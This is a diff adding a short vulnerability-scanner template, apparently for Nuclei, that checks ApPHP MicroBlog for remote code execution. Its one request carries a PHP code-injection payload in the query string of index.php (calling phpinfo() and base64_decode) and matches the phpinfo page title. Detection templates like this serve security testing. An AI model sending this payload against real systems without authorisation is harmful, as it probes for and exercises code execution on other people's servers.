@@ -1,0 +1,18 @@
+id: ApPHP-MicroBlog-rce
+#test purpose
+
+
+info:
+  name:  ApPHP-MicroBlog-rce.yaml
+  author: medbsq
+  severity: hight
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?b);phpinfo();echo(base64_decode('T3BlblZBUwo')=/"
+    matchers:
+      - type: word
+        words:
+          - "<title>phpinfo()"
+        part: body
